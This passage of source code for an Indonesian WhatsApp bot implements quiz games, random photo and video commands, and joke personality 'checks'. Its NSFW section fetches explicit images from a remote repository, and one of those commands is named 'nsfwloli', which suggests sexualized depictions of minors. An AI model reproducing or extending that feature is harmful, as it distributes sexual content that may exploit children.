if (!isCreator && !isPremium) { db.data.users[m.sender].glimit -= 1 }
let anu = await fetchJson('https://raw.githubusercontent.com/vreden/vreden/main/asahotak.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
asahotak[m.chat] = [
await vreden.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (asahotak[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete asahotak[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'lengkapikalimat': {
const gamecek = await cekgame(m.chat)
if (gamecek) return 
if (db.data.users[m.sender].glimit < 1) return warning(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { db.data.users[m.sender].glimit -= 1 }
let anu = await fetchJson('https://raw.githubusercontent.com/vreden/vreden/main/lengkapikalimat.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
lengkapikalimat[m.chat] = [
await vreden.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (lengkapikalimat[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete lengkapikalimat[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'family100': {
if (!m.isGroup) return warning(mess.OnlyGrup)
if ('family100'+m.chat in _family100) {
m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
throw false
}
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
_family100['family100'+m.chat] = {
id: 'family100'+m.chat,
pesan: await vreden.sendText(m.chat, hasil, m),
...random,
terjawab: Array.from(random.jawaban, () => false),
hadiah: 6,
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tebakbendera': {
const gamecek = await cekgame(m.chat)
if (gamecek) return 
if (db.data.users[m.sender].glimit < 1) return warning(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { db.data.users[m.sender].glimit -= 1 }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.name)
tebakbendera[m.chat] = [
await vreden.sendMessage(m.chat, { image: { url: result.img }, caption: `Gambar diatas adalah bendera negara?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._` }, { quoted: m }), result, 250,
setTimeout(() => {
if (tebakbendera[m.chat]) {
m.reply(waktuHabis(result.name))
delete tebakbendera[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tebakkalimat': {
const gamecek = await cekgame(m.chat)
if (gamecek) return 
if (db.data.users[m.sender].glimit < 1) return warning(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { db.data.users[m.sender].glimit -= 1 }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakkalimat[m.chat] = [
await vreden.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (tebakkalimat[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete tebakkalimat[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tebaksiapa': {
const gamecek = await cekgame(m.chat)
if (gamecek) return 
if (db.data.users[m.sender].glimit < 1) return warning(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { db.data.users[m.sender].glimit -= 1 }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
siapaaku[m.chat] = [
await vreden.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (siapaaku[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete siapaaku[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tebakkimia': {
const gamecek = await cekgame(m.chat)
if (gamecek) return 
if (db.data.users[m.sender].glimit < 1) return warning(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { db.data.users[m.sender].glimit -= 1 }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.unsur)
tebakkimia[m.chat] = [
await vreden.sendText(m.chat, `Apa Arti Dari Simbol : *${result.lambang}*?\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (tebakkimia[m.chat]) {
m.reply(waktuHabis(result.unsur))
delete tebakkimia[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tebaklirik': {
const gamecek = await cekgame(m.chat)
if (gamecek) return 
if (db.data.users[m.sender].glimit < 1) return warning(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { db.data.users[m.sender].glimit -= 1 }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebaklirik[m.chat] = [
await vreden.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (tebaklirik[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete tebaklirik[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tebaktebakan': {
const gamecek = await cekgame(m.chat)
if (gamecek) return 
if (db.data.users[m.sender].glimit < 1) return warning(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { db.data.users[m.sender].glimit -= 1 }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebaktebakan[m.chat] = [
await vreden.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (tebaktebakan[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete tebaktebakan[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'susunkata': {
const gamecek = await cekgame(m.chat)
if (gamecek) return 
if (db.data.users[m.sender].glimit < 1) return warning(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { db.data.users[m.sender].glimit -= 1 }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
susunkata[m.chat] = [
await vreden.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\nSoal : ${result.soal}\nTipe : ${result.tipe}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (susunkata[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete susunkata[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'caklontong': {
const gamecek = await cekgame(m.chat)
if (gamecek) return 
if (db.data.users[m.sender].glimit < 1) return warning(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { db.data.users[m.sender].glimit -= 1 }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
caklontong[m.chat] = [
await vreden.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\nSoal : ${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (caklontong[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete caklontong[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tekateki': {
const gamecek = await cekgame(m.chat)
if (gamecek) return 
if (db.data.users[m.sender].glimit < 1) return warning(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { db.data.users[m.sender].glimit -= 1 }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tekateki[m.chat] = [
await vreden.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (tekateki[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete tekateki[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'bantuan': {
if (m.chat in tebakgambar) {
let json = tebakgambar[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tebakgame) {
let json = tebakgame[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tebakhero) {
let json = tebakhero[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tebakff) {
let json = tebakff[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tebakaplikasi) {
let json = tebakaplikasi[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tebakkata) {
let json = tebakkata[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in asahotak) {
let json = asahotak[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in lengkapikalimat) {
let json = lengkapikalimat[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tebakbendera) {
let json = tebakbendera[m.chat][1]
m.reply('```' + json.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tebakkalimat) {
let json = tebakkalimat[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in siapaaku) {
let json = siapaaku[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tebakkimia) {
let json = tebakkimia[m.chat][1]
m.reply('```' + json.unsur.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tebaklirik) {
let json = tebaklirik[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tebaktebakan) {
let json = tebaktebakan[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in susunkata) {
let json = susunkata[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in caklontong) {
let json = caklontong[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tekateki) {
let json = tekateki[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'nyerah': {
if (m.chat in siapaaku) {
clearTimeout(siapaaku[m.chat][3])
delete siapaaku[m.chat]
let rk = await randomNomor(40)
db.data.users[m.sender].rank -= rk
return vreden.sendMessage(m.chat, {text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`}, {quoted: fconver})
}
if (m.chat in tebakkalimat) {
clearTimeout(tebakkalimat[m.chat][3])
delete tebakkalimat[m.chat]
let rk = await randomNomor(40)
db.data.users[m.sender].rank -= rk
return vreden.sendMessage(m.chat, {text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`}, {quoted: fconver})
}
if (m.chat in tebakbendera) {
clearTimeout(tebakbendera[m.chat][3])
delete tebakbendera[m.chat]
let rk = await randomNomor(40)
db.data.users[m.sender].rank -= rk
return vreden.sendMessage(m.chat, {text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`}, {quoted: fconver})
}
if (m.chat in tebakkata) {
clearTimeout(tebakkata[m.chat][3])
delete tebakkata[m.chat]
let rk = await randomNomor(40)
db.data.users[m.sender].rank -= rk
return vreden.sendMessage(m.chat, {text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`}, {quoted: fconver})
}
if (m.chat in asahotak) {
clearTimeout(asahotak[m.chat][3])
delete asahotak[m.chat]
let rk = await randomNomor(40)
db.data.users[m.sender].rank -= rk
return vreden.sendMessage(m.chat, {text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`}, {quoted: fconver})
}
if (m.chat in lengkapikalimat) {
clearTimeout(lengkapikalimat[m.chat][3])
delete lengkapikalimat[m.chat]
let rk = await randomNomor(40)
db.data.users[m.sender].rank -= rk
return vreden.sendMessage(m.chat, {text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`}, {quoted: fconver})
}
if (m.chat in tebakgame) {
clearTimeout(tebakgame[m.chat][3])
delete tebakgame[m.chat]
let rk = await randomNomor(40)
db.data.users[m.sender].rank -= rk
return vreden.sendMessage(m.chat, {text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`}, {quoted: fconver})
}
if (m.chat in tebakhero) {
clearTimeout(tebakhero[m.chat][3])
delete tebakhero[m.chat]
let rk = await randomNomor(40)
db.data.users[m.sender].rank -= rk
return vreden.sendMessage(m.chat, {text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`}, {quoted: fconver})
}
if (m.chat in tebakff) {
clearTimeout(tebakff[m.chat][3])
delete tebakff[m.chat]
let rk = await randomNomor(40)
db.data.users[m.sender].rank -= rk
return vreden.sendMessage(m.chat, {text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`}, {quoted: fconver})
}
if (m.chat in tebakaplikasi) {
clearTimeout(tebakaplikasi[m.chat][3])
delete tebakaplikasi[m.chat]
let rk = await randomNomor(40)
db.data.users[m.sender].rank -= rk
return vreden.sendMessage(m.chat, {text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`}, {quoted: fconver})
}
if (m.chat in tebakkimia) {
clearTimeout(tebakkimia[m.chat][3])
delete tebakkimia[m.chat]
let rk = await randomNomor(40)
db.data.users[m.sender].rank -= rk
return vreden.sendMessage(m.chat, {text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`}, {quoted: fconver})
}
if (m.chat in tebaklirik) {
clearTimeout(tebaklirik[m.chat][3])
delete tebaklirik[m.chat]
let rk = await randomNomor(40)
db.data.users[m.sender].rank -= rk
return vreden.sendMessage(m.chat, {text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`}, {quoted: fconver})
}
if (m.chat in tebaktebakan) {
clearTimeout(tebaktebakan[m.chat][3])
delete tebaktebakan[m.chat]
let rk = await randomNomor(40)
db.data.users[m.sender].rank -= rk
return vreden.sendMessage(m.chat, {text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`}, {quoted: fconver})
}
if (m.chat in susunkata) {
clearTimeout(susunkata[m.chat][3])
delete susunkata[m.chat]
let rk = await randomNomor(40)
db.data.users[m.sender].rank -= rk
return vreden.sendMessage(m.chat, {text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`}, {quoted: fconver})
}
if (m.chat in caklontong) {
clearTimeout(caklontong[m.chat][3])
delete caklontong[m.chat]
let rk = await randomNomor(40)
db.data.users[m.sender].rank -= rk
return vreden.sendMessage(m.chat, {text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`}, {quoted: fconver})
}
if (m.chat in tebakgambar) {
clearTimeout(tebakgambar[m.chat][3])
delete tebakgambar[m.chat]
let rk = await randomNomor(40)
db.data.users[m.sender].rank -= rk
return vreden.sendMessage(m.chat, {text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`}, {quoted: fconver})
}
if (m.chat in tekateki) {
clearTimeout(tekateki[m.chat][3])
delete tekateki[m.chat]
let rk = await randomNomor(40)
db.data.users[m.sender].rank -= rk
return vreden.sendMessage(m.chat, {text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`}, {quoted: fconver})
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
//▢━━━━━━━━━━━━━━「 ASUPAN COMMAND 」━━━━━━━━━━━━━━▢
case 'asupan': case 'bocil': case 'geayubi': case 'kayes': case 'notnot': case 'rikagusriani': case 'santuy': case 'ukhty': {
if (!isCreator&&!isPremium) return tolakk(mess.OnlyPrem)
let asup = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-asupan/main/${command}.json`)
const dl_url = await pickRandom(asup)
await vreden.sendMessage(m.chat, { video: { url: dl_url }, caption: `🍟 Random ${command}`,gifPlayback: false},{quoted: m})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'hijaber': case 'jeni': case 'jiso': case 'justina': case 'rose': case 'ryujin': {
if (!isCreator&&!isPremium) return tolakk(mess.OnlyPrem)
let asup = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-asupan/main/${command}.json`)
const dl_url = await pickRandom(asup)
vreden.sendMessage(m.chat, { image: { url: dl_url }, caption: `🍟 Random ${command}` }, { quoted: m })
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'vietnam': case 'korea': case 'indonesian': case 'japan': case 'thailand': case 'china':
{
if (!isCreator&&!isPremium) return tolakk(mess.OnlyPrem)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let cecan = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-cecan/main/${command}.json`)
const dl_url = await pickRandom(cecan)
vreden.sendMessage(m.chat, { image: { url: dl_url }, caption: `🍟 Cewek ${command}` }, { quoted: m })
}
db.data.users[m.sender].exp += await randomNomor(20)
break
//▢━━━━━━━━━━━━━━「 COGAN COMMAND 」━━━━━━━━━━━━━━▢
case 'wuyifan': case 'suga': case 'parkchanyeol': case 'ohsehun': case 'luhan': case 'kimtaehyung': case 'kimsoek': case 'kimnanjoon': case 'kimminseok': case 'kimjunmyeon': case 'kimjong': case 'kimjondae': case 'jungkook': case 'jimin': case 'jhope': case 'huangzitao': case 'dohkyungsoo': case 'baekhyung':
{
if (!isCreator&&!isPremium) return tolakk(mess.OnlyPrem)
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let cogan = await getBuffer(`https://api.zeeoneofc.my.id/api/cogan/${command}?apikey=${setting.BotKey}`)
await vreden.sendMessage(m.chat, {image: cogan, caption: 'Nih Kak Cowok Gantengnya 😋'},{quoted: m})
}
break// Fix Qioo
//▢━━━━━━━━━━━━━━「 NSFW COMMAND 」━━━━━━━━━━━━━━▢
case 'ahegao':
case 'ass':
case 'bdsm':
case 'blowjob':
case 'cuckold':
case 'cum':
case 'eba':
case 'ero':
case 'femdom':
case 'foot':
case 'gangbang':
case 'gifs':
case 'glasses':
case 'hentai':
case 'jahy':
case 'manga':
case 'masturbation':
case 'milf':
case 'neko':
case 'neko2':
case 'nsfwloli':
case 'orgy':
case 'panties':
case 'pussy':
case 'tentacles':
case 'thighs':
case 'yuri':
case 'zettai':{
if (!isCreator&&!isPremium) return tolakk(mess.OnlyPrem)
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!db.data.chats[m.chat].nsfw) return m.reply("NSFW tidak diaktifkan di grup ini")
let nsfw = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-nsfw/main/${command}.json`)
const dl_url = await pickRandom(nsfw)
vreden.sendMessage(m.chat, { image: { url: dl_url.url }, caption: `🍟 Nsfw ${command}` }, { quoted: m })
}
db.data.users[m.sender].exp += await randomNomor(20)
break
//▢━━━━━━━━━━━━━━「 FUN COMMAND 」━━━━━━━━━━━━━━▢
case 'apakah': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!q) return warning(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul','Kagak tau gw 🗿','Kenapa tanya gw?🗿','Maleslah mau makan dulu']
const kah = apa[Math.floor(Math.random() * apa.length)]
m.reply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'bisakah': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!q) return warning(`Penggunaan ${command} text\n\nContoh : ${command} saya menjadi presiden`)
const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
m.reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'bagaimanakah': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!q) return warning(`Penggunaan ${command} text\n\nContoh : ${command} cara mengatasi sakit hati`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
m.reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ya}`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'rate': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!q) return warning(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const te = ra[Math.floor(Math.random() * ra.length)]
m.reply(`Rate : ${q}\nJawaban : *${te}%*`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'gantengcek': case 'cekganteng': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!q) return warning(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const teng = gan[Math.floor(Math.random() * gan.length)]
m.reply(`Nama : ${q}\nJawaban : *${teng}*`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
break           
case 'cantikcek': case 'cekcantik': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!q) return warning(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const tik = can[Math.floor(Math.random() * can.length)]
m.reply(`Nama : ${q}\nJawaban : *${tik}*`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ceksifat': case 'sifatcek': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!q) return warning(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
var a = await randomNomor(100)
var b = await randomNomor(100)
let ce = ['Baik Hati', 'Sombong', 'Pelit', 'Dermawan', 'Rendah Hati', 'Rendah Diri', 'Pemalu', 'Penakut', 'Pengusil', 'Cengeng']
const c = ce[Math.floor(Math.random() * ce.length)]
let de = ['Rajin', 'Malas', 'Membantu', 'Ngegosip', 'Jail', 'Gak jelas', 'Shoping', 'Chattan sama Doi', 'Chattan di WA karna Jomblo', 'Sedih', 'Kesepian', 'Bahagia']
const d = de[Math.floor(Math.random() * de.length)]
var e = await randomNomor(100)
var f = await randomNomor(100)
var g = await randomNomor(100)
var h = await randomNomor(100)
let cksft = `*SIFAT ${text}* 🔖\n\n❏ Nama : *${text}*\n❏ Ahlak Baik : *${a}%*\n❏ Ahlak Buruk : *${b}%*\n❏ Orang yang : *${c}*\n❏ Selalu : *${d}*\n❏ Kecerdasan : *${e}%*\n❏ Kenakalan : *${f}%*\n❏ Keberanian : *${g}%*\n❏ Ketakutan : *${h}%*`
m.reply(cksft)
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'masadepan': case 'masadepannya': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!q) return warning(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
var a = await randomNomor(10)
var b = await randomNomor(10)
var c = await randomNomor(10)
var d = await randomNomor(10)
var e = await randomNomor(10)
var f = await randomNomor(10)
var g = await randomNomor(10)
var h = await randomNomor(10)
let msdpn = [
        `${text} akan menjadi orang yang kaya, keluarga yang harmonis, memiliki ${b} anak, memiliki ${d}, memiliki kendaraan, memiliki rumah`,
        `${text} akan menjadi orang yang sederhana, keluarga yang harmonis, memiliki ${c}, memiliki ${a} anak, memiliki kendaraan, memiliki rumah`,
        `${text} akan menjadi orang yang miskin, keluarga yang sederhana, memiliki ${a} anak, tidak memiliki kendaraan, rumah ngontrak`,
        `${text} akan menjadi orang yang sederhana, keluarga yang dicerai, memiliki ${e} anak, memiliki ${b} kendaraan, memiliki ${b} rumah`,
        `${text} akan menjadi orang yang sederhana, keluarga yang sederhana, memiliki ${b} anak, memiliki ${b} kendaraan, memiliki ${a} rumah`,
        `${text} akan menjadi orang yang miskin, keluarga yang dicerai memiliki ${b} anak, memiliki ${a} kendaraan, memiliki ${a} rumah`,
        `${text} akan menjadi orang yang kaya, keluarga yang sederhana, memiliki ${a} anak, memiliki ${a} kendaraan, memiliki ${b} rumah`,
